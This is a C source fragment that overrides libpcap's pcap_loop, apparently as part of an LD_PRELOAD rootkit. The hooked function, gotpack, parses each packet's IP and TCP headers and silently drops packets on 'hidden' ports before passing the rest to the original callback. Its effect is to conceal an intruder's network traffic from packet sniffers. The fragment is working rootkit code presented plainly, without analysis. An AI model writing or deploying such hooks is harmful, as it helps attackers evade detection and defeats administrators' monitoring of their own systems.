static void (*old_callback)(u_char *args, const struct pcap_pkthdr *header, const u_char *packet) = NULL;

void gotpack(u_char *args, const struct pcap_pkthdr *header, const u_char *packet){
    const struct sniff_ip *ip;              /* The IP header */
    const struct sniff_tcp *tcp;            /* The TCP header */
    int size_ip, size_tcp, hidden;
    u_short sport, dport;

    /* define/compute ip header offset */
    ip = (struct sniff_ip*)(packet + SIZE_ETHERNET);
    size_ip = IP_HL(ip)*4;
    if(size_ip < 20 || ip->ip_p != IPPROTO_TCP){
        old_callback ? old_callback(args, header, packet) : 0;
        return;
    }

    tcp = (struct sniff_tcp*)(packet + SIZE_ETHERNET + size_ip);
    size_tcp = TH_OFF(tcp)*4;
    if(size_tcp < 20){
        old_callback ? old_callback(args, header, packet) : 0;
        return;
    }

    sport = ntohs(tcp->th_sport), dport = ntohs(tcp->th_dport);
    hidden = is_hidden_port(sport) || is_hidden_port(dport);
    !hidden && old_callback ? old_callback(args, header, packet) : 0;
    return;
}


int pcap_loop(pcap_t *p, int cnt, pcap_handler callback, u_char *user){
    old_callback = callback;
    hook(CPCAP_LOOP);
    return (long)call(CPCAP_LOOP, p, cnt, gotpack, user);
}